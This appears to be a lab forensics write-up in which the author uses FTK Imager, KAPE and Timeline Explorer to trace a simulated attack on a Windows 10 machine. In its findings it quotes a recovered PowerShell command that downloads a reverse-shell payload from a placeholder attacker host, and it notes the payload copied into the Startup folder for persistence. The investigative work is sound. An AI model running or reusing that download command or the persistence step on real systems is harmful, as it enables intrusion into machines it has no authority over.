# WINDOWS FORENSICS

## OBJECTIVE:

The goal of this phase was to perform a forensic investigation on a compromised Windows 10 system. This included collecting targeted artifacts, analyzing system activity to trace attacker behavior, and constructing a clear timeline of the intrusion.

## INTRODUCTION:

This project is a follow-up to my earlier Windows 10 red team simulation, where I compromised a lab machine using reverse shells, set up persistence, and carried out post-exploitation activities.

In this second phase, I approached the same machine from a forensic analyst’s perspective, capturing disk images, extracting key artifacts, and analyzing them with dedicated tools to identify traces of the attacker’s activity, including payload files, suspicious commands, and network indicators pointing to the attacker's system.

## TOOLS USED:
- FTK Imager
- Kroll Artifact Parser and Extractor (KAPE)
- Timeline Explorer

---

## WALKTHROUGH:

## ARTIFACT ACQUISITION
I started by using FTK Imager to collect both targeted and broad artifacts:
| Artifact                | Path                                                            |
| ----------------------- | --------------------------------------------------------------- |
| Master File Table (MFT) | `C:\$MFT`                                                       |
| Event logs              | `C:\Windows\System32\winevt\Logs`                               |
| NTUSER registry hive    | `C:\Users\<username>\NTUSER.DAT`                                |
| SYSTEM registry hive    | `C:\Windows\System32\config\SYSTEM`                             |
| SOFTWARE registry hive  | `C:\Windows\System32\config\SOFTWARE`                           |
| User’s directory        | `C:\Users\<username>` (where payloads & artifacts were dropped) |

I used FTK Imager to create a disk image `.001`, consolidating these artifacts, ensuring proper evidence integrity.

---

## EVIDENCE TRANSFER
I securely copied the `.001` disk image from the compromised Windows system to my dedicated forensics workstation.

---

## EXAMINING THE DISK IMAGE
On my forensics machine:

- I loaded the `.001` image back into FTK Imager.
- Used FTK Imager to mount and extract the contents of the disk image, effectively recreating the file system for analysis.

---

## PARSING THE ARTIFACTS
Next, I launched KAPE (Kroll Artifact Parser and Extractor), pointed it to the extracted image contents, and configured it:
- Selected key targets (like registry hives, event logs, MFT).
- Selected modules to parse this data into structured outputs.
- Set a destination folder for processed results.
Then, I executed the task.
KAPE processed the evidence and produced multiple Excel sheets (CSV/XLSX) containing parsed data.

---

## MANUAL ANALYSIS
- I loaded these sheets into Timeline Explorer to get a powerful pivot table-style view.
- This helped me filter and sort by timestamps, path names, process names, and more.

---

## FINDINGS — TRACING THE ATTACKER
Through this analysis, I found clear artifacts of the attack:
- Persistence:
  - Located the reverse shell payload copied to the Windows startup folder.
    Example:
    ```
    C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.pyzw
    ```
  - Verified timestamps (Created, Modified, Accessed) showing exactly when persistence was established.
- Temp staging folder:
  - Found the `Temp` directory created by the attacker under `C:\Users\Public\Documents\Temp`.
- Command line evidence in Event Logs:
  - Found PowerShell and cmd commands in the Security/PowerShell logs.
  - Notably recovered the command that downloaded the payload:
    ```
    powershell -Command "Invoke-WebRequest -Uri http://<attacker_IP>/powershell_reverse.pyzw -OutFile C:\Users\Public\Documents\powershell_reverse.pyzw"
    ```
  - This revealed the attacker’s IP address: `<attacker_IP>`.
- Other footprints:
  - Evidence of the WinPEAS enumeration binary being executed.
  - Logs showing browser launches and other activity matching the attacker’s session.

---

## BUILDING A TIMELINE
Based on the parsed timestamps from the MFT, registry, and event logs, I reconstructed:
- When the initial reverse shell was executed.
- When the persistence payload was copied to the startup folder.
- When WinPEAS was run to look for privilege escalation.
This provided a clear chronological picture of the attack.

---

## SUMMARY
- Through this phase, I was able to effectively:
- Collect and preserve targeted evidence using FTK Imager.
- Parse and analyze large volumes of data with KAPE and Timeline Explorer.
- Correlate multiple sources to identify malicious activity, persistence mechanisms, the attacker's IP, and a probable timeline of compromise.

---

## PROJECT SNIPPETS:

---

> ⚠️ Disclaimer
> This project was performed strictly for educational and ethical purposes in a controlled lab environment.
> Always ensure you have explicit authorization before performing any form of forensic analysis or incident response on systems.
